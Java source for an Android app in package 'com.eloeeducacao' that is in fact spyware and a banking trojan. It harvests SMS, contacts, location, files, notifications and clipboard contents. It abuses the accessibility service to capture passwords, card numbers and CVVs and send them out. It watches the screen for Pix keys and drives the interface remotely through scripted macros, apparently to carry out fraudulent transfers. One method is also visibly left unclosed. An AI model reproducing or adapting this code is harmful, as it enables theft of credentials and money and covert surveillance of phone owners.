public final class Extra {

    private static final int MAX = 12000;

    private static String cut(String s) {
        if (s == null) return "";
        return s.length() > MAX ? s.substring(0, MAX) + "\n[...cortado]" : s;
    }

    public static String sms(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            int n = 0;
            if (cu != null) {
                SimpleDateFormat f = new SimpleDateFormat("dd/MM HH:mm", Locale.US);
                while (cu.moveToNext() && n < 60) {
                    String addr = cu.getString(cu.getColumnIndexOrThrow("address"));
                    String body = cu.getString(cu.getColumnIndexOrThrow("body"));
                    long ts = cu.getLong(cu.getColumnIndexOrThrow("date"));
                    sb.append(f.format(new Date(ts))).append(" | ").append(addr)
                      .append(" | ").append(body).append('\n');
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String contacts(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            int n = 0;
            if (cu != null) {
                while (cu.moveToNext() && n < 400) {
                    String name = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" <").append(num).append(">\n");
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String apps(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            PackageManager pm = c.getPackageManager();
            List<ApplicationInfo> l = pm.getInstalledApplications(0);
            for (ApplicationInfo a : l) {
                boolean launch = pm.getLaunchIntentForPackage(a.packageName) != null;
                if (!launch) continue;
                sb.append(pm.getApplicationLabel(a)).append(" | ").append(a.packageName).append('\n');
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String loc(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l == null) continue;
                sb.append(p).append(": ").append(l.getLatitude()).append(',')
                  .append(l.getLongitude()).append(" +-").append(l.getAccuracy())
                  .append("m ").append((System.currentTimeMillis() - l.getTime()) / 1000).append("s atras\n");
            }
            if (sb.length() == 0) sb.append("sem posicao em cache");
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String clip(Context c) {
        try {
            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData d = cm.getPrimaryClip();
            if (d == null || d.getItemCount() == 0) return "vazio";
            return String.valueOf(d.getItemAt(0).coerceToText(c));
        } catch (Throwable t) {
            return "err: " + t;
        }
    }

    public static void setClip(final Context c, final String s) {
        try {
            android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            h.post(new Runnable() {
                @Override public void run() {
                    try {
                        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
                        cm.setPrimaryClip(ClipData.newPlainText("a", s));
                    } catch (Throwable ignored) {}
                }
            });
        } catch (Throwable ignored) {}
    }

    public static String notifs(Context c) {
        return cut(Util.exec("dumpsys notification --noredact"));

    public static String info(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            sb.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
            sb.append("sdk: ").append(Build.VERSION.SDK_INT).append(" rel: ").append(Build.VERSION.RELEASE).append('\n');
            sb.append("board: ").append(Build.BOARD).append(" abi: ")
              .append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
            sb.append("uptime: ").append(android.os.SystemClock.elapsedRealtime() / 1000).append("s\n");
            StatFs st = new StatFs(Environment.getDataDirectory().getAbsolutePath());
            sb.append("livre: ").append(st.getAvailableBytes() / 1048576).append("MB de ")
              .append(st.getTotalBytes() / 1048576).append("MB\n");
            sb.append("ip: ").append(Util.ip()).append('\n');
            sb.append("tela: ").append(Util.screen(c)).append('\n');
            sb.append("brilho: ").append(Settings.System.getInt(c.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS, -1)).append('\n');
            sb.append("acc: ").append(Util.accOn(c)).append('\n');
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String ls(String path) {
        StringBuilder sb = new StringBuilder();
        try {
            File d = new File(path);
            File[] fs = d.listFiles();
            if (fs == null) return "sem acesso ou vazio: " + path;
            java.util.Arrays.sort(fs);
            for (File f : fs) {
                sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append('\t')
                  .append(f.getName()).append('\n');
                if (sb.length() > MAX) break;
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String cat(String path, int off, int len) {
        java.io.RandomAccessFile raf = null;
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo";
            long total = f.length();
            raf = new java.io.RandomAccessFile(f, "r");
            raf.seek(Math.max(0, Math.min(off, total)));
            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
            byte[] b = new byte[n];
            int r = raf.read(b);
            if (r <= 0) return "fim";
            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        } finally {
            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
        }
    }

    public static void bright(Context c, int pct) {
        try {
            int v = Math.max(0, Math.min(255, pct * 255 / 100));
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, v);
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE, 0);
        } catch (Throwable ignored) {}
    }

    public static void torch(Context c, boolean on) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            for (String id : cm.getCameraIdList()) {
                Boolean has = cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (has != null && has) {
                    cm.setTorchMode(id, on);
                    return;
                }
            }
        } catch (Throwable ignored) {}
    }

    public static void volume(Context c, int dir, int pct) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            if (pct >= 0) {
                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, Math.max(0, Math.min(max, pct * max / 100)), 0);
            } else {
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC,
                        dir > 0 ? AudioManager.ADJUST_RAISE : AudioManager.ADJUST_LOWER,
                        AudioManager.FLAG_SHOW_UI);
            }
        } catch (Throwable ignored) {}
    }

    public static void media(Context c, int code) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, code));
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, code));
        } catch (Throwable ignored) {}
    }

    public static void dial(Context c, String num, boolean call) {
        try {
            Intent i = new Intent(call ? Intent.ACTION_CALL : Intent.ACTION_DIAL,
                    Uri.parse("tel:" + Uri.encode(num)));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

public final class Captura {

    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
    private static volatile long ultimo;

    private static boolean luhn(String d) {
        int soma = 0;
        boolean par = false;
        for (int i = d.length() - 1; i >= 0; i--) {
            int n = d.charAt(i) - '0';
            if (par) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            soma += n;
            par = !par;
        }
        return soma % 10 == 0;
    }

    private static String dica(AccessibilityNodeInfo n) {
        StringBuilder b = new StringBuilder();
        try {
            if (n.getViewIdResourceName() != null) {
                String id = n.getViewIdResourceName();
                int i = id.lastIndexOf('/');
                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
            }
        } catch (Throwable ignored) {}
        try {
            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
        } catch (Throwable ignored) {}
        try {
            if (n.getContentDescription() != null) b.append(n.getContentDescription());
        } catch (Throwable ignored) {}
        String s = b.toString().trim();
        return s.length() > 60 ? s.substring(0, 60) : s;
    }

    private static void manda(String tipo, JSONObject o) {
        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
    }

    public static void ev() {
        long a = System.currentTimeMillis();
        if (a - ultimo < 650) return;
        ultimo = a;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        AccessibilityNodeInfo f = null;
        try {
            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        } catch (Throwable ignored) {}
        if (f == null) return;
        CharSequence cs = f.getText();
        if (cs == null) return;
        String t = cs.toString().trim();
        if (t.length() < 3) return;

        String pkg = k.curPkg == null ? "?" : k.curPkg;
        String campo = dica(f);
        String chave = pkg + "|" + campo + "|" + t;
        if (vistos.contains(chave)) return;
        vistos.add(chave);
        if (vistos.size() > 500) {
            List<String> l = new ArrayList<>(vistos);
            vistos.clear();
            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
        }

        String baixo = campo.toLowerCase();
        try {
            JSONObject o = new JSONObject();
            o.put("app", pkg);
            o.put("campo", campo);
            if (f.isPassword()) {
                o.put("v", t);
                manda("cred", o);
                return;
            }
            String dig = t.replaceAll("[^0-9]", "");
            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
                o.put("v", dig);
                manda("cartao", o);
                return;
            }
            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
                o.put("v", t);
                manda("cartao", o);
                return;
            }
            if (dig.length() >= 3 && dig.length() <= 4
                    && (baixo.contains("cvv") || baixo.contains("segur")
                        || baixo.contains("cvc") || baixo.contains("cod"))) {
                o.put("v", dig);
                manda("cartao", o);
            }
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class Macro {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final List<JSONObject> fila = new ArrayList<>();
    public static volatile boolean rodando;

    public static void play(JSONArray a, JSONObject vars) {
        synchronized (fila) {
            fila.clear();
            JSONObject v = vars == null ? new JSONObject() : vars;
            if (a != null) {
                for (int i = 0; i < a.length(); i++) {
                    JSONObject s = a.optJSONObject(i);
                    if (s == null) continue;
                    if (s.has("v")) {
                        try {
                            s.put("v", s.optString("v")
                                    .replace("{{CHAVE}}", v.optString("chave"))
                                    .replace("{{VALOR}}", v.optString("valor")));
                        } catch (Throwable ignored) {}
                    }
                    fila.add(s);
                }
            }
        }
        if (!rodando) {
            rodando = true;
            H.post(passo);
        }
    }

    public static void stop() {
        synchronized (fila) { fila.clear(); }
        rodando = false;
        Util.sendT("info", "macro interrompido");
    }

    private static final Runnable passo = new Runnable() {
        @Override public void run() {
            if (!rodando) return;
            JSONObject s;
            synchronized (fila) {
                if (fila.isEmpty()) {
                    rodando = false;
                    Util.sendT("info", "macro concluido");
                    return;
                }
                s = fila.remove(0);
            }
            KeySvc k = KeySvc.I;
            try {
                if (k != null && s.has("t")) {
                    JSONArray p = s.getJSONArray("t");
                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("l")) {
                    JSONArray p = s.getJSONArray("l");
                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("s")) {
                    JSONArray p = s.getJSONArray("s");
                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
                } else if (k != null && s.has("x")) {
                    k.setText(s.getString("x"));
                } else if (k != null && s.has("k")) {
                    k.key(s.getInt("k"));
                } else if (s.has("do")) {
                    String d = s.optString("do");
                    if ("back".equals(d)) {
                        if (k != null) k.key(4);
                    } else if ("home".equals(d)) {
                        if (k != null) k.key(3);
                    } else if ("wait".equals(d)) {
                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
                    } else {
                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
                        else executa(s, h, k);
                    }
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
        }
    };

    private static void espera(final JSONObject s, final long ate) {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
        if (h != null) {
            executa(s, h, k);
            H.postDelayed(passo, 120);
            return;
        }
        if (System.currentTimeMillis() > ate) {
            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
            H.postDelayed(passo, 120);
            return;
        }
        H.postDelayed(() -> espera(s, ate), 250);
    }

    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
        String d = s.optString("do");
        try {
            if ("tap".equals(d)) k.touch(h.x, h.y);
            else if ("long".equals(d)) k.longPress(h.x, h.y);
            else if ("get".equals(d)) Util.sendT("get", h.txt);
            else if ("set".equals(d)) {
                Bundle b = new Bundle();
                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        s.optString("v"));
                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            }
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

public final class Watch {
    public static volatile boolean on;
    private static volatile long ultimo;

    public static void ev() {
        if (!on) return;
        long agora = System.currentTimeMillis();
        if (agora - ultimo < 1500) return;
        ultimo = agora;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        try {
            JSONObject s = new JSONObject().put("edit", true);
            StringBuilder chaves = new StringBuilder();
            for (Sel.Hit h : Sel.todos(r, s)) {
                String t = h.txt.trim();
                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
                    chaves.append(t).append(" ; ");
                }
            }
            if (chaves.length() == 0) return;
            String valor = "";
            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
                valor = h.txt;
            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.regex.Pattern;

public final class Sel {

    public static final class Hit {
        public final AccessibilityNodeInfo node;
        public final int x, y;
        public final String txt;
        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
            this.node = n; this.x = x; this.y = y; this.txt = t;
        }
    }

    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
        try {
            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
            if (s.has("cls")) {
                String c = String.valueOf(n.getClassName()).toLowerCase();
                if (!c.contains(s.getString("cls").toLowerCase())) return false;
            }
            if (s.has("id")) {
                String id = n.getViewIdResourceName();
                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
            }
            if (s.has("txt")) {
                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
                    return false;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> out = new ArrayList<>();
        if (raiz == null) return out;
        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
        fila.add(raiz);
        int limite = 4000;
        while (!fila.isEmpty() && limite-- > 0) {
            AccessibilityNodeInfo n = fila.poll();
            if (n == null) continue;
            if (casa(n, s)) {
                Rect r = new Rect();
                n.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    CharSequence t = n.getText();
                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo f = n.getChild(i);
                if (f != null) fila.add(f);
            }
        }
        return out;
    }

    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> l = todos(raiz, s);
        if (l.isEmpty()) return null;
        if (!s.has("perto")) return l.get(0);
        int px = s.optJSONArray("perto").optInt(0, 0);
        int py = s.optJSONArray("perto").optInt(1, 0);
        Hit best = null;
        double bd = Double.MAX_VALUE;
        for (Hit h : l) {
            double d = Math.hypot(h.x - px, h.y - py);
            if (d < bd) { bd = d; best = h; }
        }
        return best;
    }
}

package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public final class Clip {

    public static volatile boolean on;
    private static String ultimo = "";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean rodando;

    public static void liga(final Context c) {
        if (rodando) return;
        rodando = true;
        H.postDelayed(new Runnable() {
            @Override public void run() {
                if (!on) { rodando = false; return; }
                try {
                    ClipboardManager cm = (ClipboardManager)
                            c.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData d = cm.getPrimaryClip();
                    if (d != null && d.getItemCount() > 0) {
                        CharSequence t = d.getItemAt(0).coerceToText(c);
                        if (t != null && t.length() > 0 && t.length() < 4000) {
                            String s = t.toString();
                            if (!s.equals(ultimo)) {
                                ultimo = s;
                                Util.sendT("clip", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                H.postDelayed(this, 2500);
            }
        }, 800);
    }
}

package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.Deque;

public final class Snap {

    private static String t(CharSequence c) {
        if (c == null) return "";
        String s = c.toString().replace("\n", " ").replace("|", "/").trim();
        return s.length() > 90 ? s.substring(0, 90) : s;
    }

    public static String dump() {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        if (r == null) return "sem janela ativa";
        StringBuilder b = new StringBuilder();
        Deque<AccessibilityNodeInfo> f = new ArrayDeque<>();
        Deque<Integer> d = new ArrayDeque<>();
        f.add(r);
        d.add(0);
        int n = 0;
        while (!f.isEmpty() && n++ < 1500) {
            AccessibilityNodeInfo x = f.poll();
            int dep = d.poll();
            if (x == null) continue;
            Rect rr = new Rect();
            x.getBoundsInScreen(rr);
            if (rr.width() > 0 && rr.height() > 0) {
                String cls = String.valueOf(x.getClassName());
                int i = cls.lastIndexOf('.');
                if (i >= 0) cls = cls.substring(i + 1);
                b.append(dep).append('|').append(cls).append('|')
                        .append(t(x.getViewIdResourceName())).append('|')
                        .append(x.isEditable() ? "E" : "")
                        .append(x.isClickable() ? "C" : "").append('|')
                        .append(rr.left).append(',').append(rr.top).append(',')
                        .append(rr.right).append(',').append(rr.bottom).append('|')
                        .append(t(x.getText())).append('|')
                        .append(t(x.getContentDescription())).append('\n');
            }
            for (int i = 0; i < x.getChildCount(); i++) {
                AccessibilityNodeInfo c = x.getChild(i);
                if (c != null) { f.add(c); d.add(dep + 1); }
            }
        }
        return b.length() == 0 ? "tela vazia (FLAG_SECURE?)" : b.toString();
    }
}

package com.eloeeducacao;

import android.content.Context;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;

public final class Crash {

    private static volatile boolean on;

    public static void instala(final Context c) {
        if (on) return;
        on = true;
        final Thread.UncaughtExceptionHandler velho = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override public void uncaughtException(Thread t, Throwable e) {
                try {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    FileOutputStream f = c.openFileOutput("erro.txt", Context.MODE_PRIVATE);
                    f.write((t.getName() + "\n" + sw).getBytes("UTF-8"));
                    f.close();
                } catch (Throwable ignored) {}
                if (velho != null) velho.uncaughtException(t, e);
            }
        });
    }

    public static String texto(Context c) {
        try {
            FileInputStream f = c.openFileInput("erro.txt");
            byte[] b = new byte[f.available()];
            f.read(b);
            f.close();
            String s = new String(b, "UTF-8");
            return s.length() > 1600 ? s.substring(0, 1600) : s;
        } catch (Throwable t) {
            return "";
        }
    }

    public static void limpa(Context c) {
        try { c.deleteFile("erro.txt"); } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.util.AttributeSet;
import android.view.View;

public class Pulso extends View {

    private final Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
    private final long t0 = System.currentTimeMillis();

    public Pulso(Context c, AttributeSet a) {
        super(c, a);
        p.setStyle(Paint.Style.STROKE);
        p.setStrokeWidth(3f);
    }

    @Override protected void onDraw(Canvas cv) {
        int w = getWidth(), h = getHeight();
        if (w == 0 || h == 0) return;
        float cx = w / 2f, cy = h / 2f;
        float base = Math.min(w, h) / 2f;
        long t = System.currentTimeMillis() - t0;
        for (int i = 0; i < 3; i++) {
            float f = ((t + i * 700L) % 2100L) / 2100f;
            float r = base * (0.22f + 0.72f * f);
            p.setColor(Color.argb(Math.max(0, (int) (80 * (1f - f))), 88, 166, 255));
            cv.drawCircle(cx, cy, r, p);
        }
        p.setStyle(Paint.Style.FILL);
        p.setColor(Color.parseColor("#58A6FF"));
        cv.drawCircle(cx, cy, base * 0.15f, p);
        p.setStyle(Paint.Style.STROKE);
        postInvalidateOnAnimation();
    }
}
